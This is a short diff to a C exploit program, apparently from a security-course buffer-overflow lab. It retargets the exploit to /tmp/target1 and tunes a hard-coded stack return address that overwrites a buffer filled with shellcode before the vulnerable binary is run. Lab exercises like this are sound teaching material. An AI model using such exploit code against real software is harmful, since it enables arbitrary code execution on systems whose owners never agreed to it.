@@ -5,7 +5,7 @@
 
 #include "shellcode.h"
 
-#define TARGET "../targets/target1"
+#define TARGET "/tmp/target1"
 
 int main() {
     char* args[3];
@@ -24,7 +24,7 @@ int main() {
 
     memcpy(args[1], shellcode, strlen(shellcode));
 
-    *(unsigned int*)(args[1] + 132) = 0xbffffd18;
+    *(unsigned int*)(args[1] + 132) = 0xbffffd28;
 
     if (0 > execve(TARGET, args, env)) {
         fprintf(stderr, "execve failed.\n");
